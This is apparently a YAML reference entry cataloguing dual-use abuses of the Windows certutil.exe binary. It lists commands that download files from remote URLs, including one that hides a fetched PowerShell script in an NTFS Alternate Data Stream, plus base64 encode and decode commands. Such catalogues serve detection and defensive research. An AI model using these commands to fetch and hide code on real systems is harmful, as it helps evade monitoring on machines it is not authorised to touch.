---
name: certutil.exe
description: Windows binary used for handeling certificates
functions:
  download:
    - description: Download and save 7zip to disk in the current folder.
      code: certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
  ads:
    - description: Download and save a PS1 file to an Alternate Data Stream (ADS).
      code: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
  encode:
    - description: Command to encode a file using Base64
      code: certutil -encode inputFileName encodedOutputFileName
  decode:
    - description: Command to decode a Base64 encoded file.
      code: certutil -decode encodedInputFileName decodedOutputFileName
resources: 
    - resource: https://twitter.com/Moriarty_Meng/status/984380793383370752
    - resource: https://twitter.com/mattifestation/status/620107926288515072
fullpath: 
    - path: c:\windows\system32\certutil.exe
    - path: c:\windows\sysWOW64\certutil.exe
notes: Thanks to Matt Graeber - @mattifestation, Moriarty - @Moriarty2016
---